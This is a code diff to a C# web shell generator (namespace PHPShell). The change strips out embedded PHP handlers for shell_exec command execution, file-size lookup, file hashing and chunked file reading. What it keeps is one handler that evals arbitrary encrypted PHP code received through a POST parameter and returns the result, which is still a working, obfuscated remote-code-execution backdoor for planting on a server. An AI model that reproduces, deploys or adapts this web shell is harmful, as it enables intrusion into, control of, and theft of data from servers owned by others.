@@ -9,18 +9,7 @@ namespace PHPShell
 	
 	public class Generator
 	{
-		static string innerShell = 	"if(isset($_POST['a']))" +
-									"{echo base64_encode(encrypt($_POST['k'], shell_exec(encrypt($_POST['k'], base64_decode($_POST['a'])))));}" +
-									"if(isset($_POST['fs']))" +
-									"{echo base64_encode(encrypt($_POST['k'], strval(filesize(encrypt($_POST['k'], base64_decode($_POST['fs']))))));}" +
-									"if(isset($_POST['fh']))" + 
-									"{echo base64_encode(encrypt($_POST['k'], hash_file('md5', encrypt($_POST['k'], base64_decode($_POST['fh'])))));}" +
-									"if(isset($_POST['d']) && isset($_POST['p']))" +
-									"{$file = fopen(encrypt($_POST['k'], base64_decode($_POST['d'])), 'rb');" +
-									"fseek($file, $_POST['p']);" +
-									"echo base64_encode(encrypt($_POST['k'], fread($file, 1024)));" +
-									"fclose($file);}" +
-									"if(isset($_POST['e']))" + 
+		static string innerShell = 	"if(isset($_POST['e']))" + 
 									"{echo base64_encode(encrypt($_POST['k'], eval(encrypt($_POST['k'], base64_decode($_POST['e'])))));}";
 		
 		public static string GenerateShell(string outputPrefix, string password)
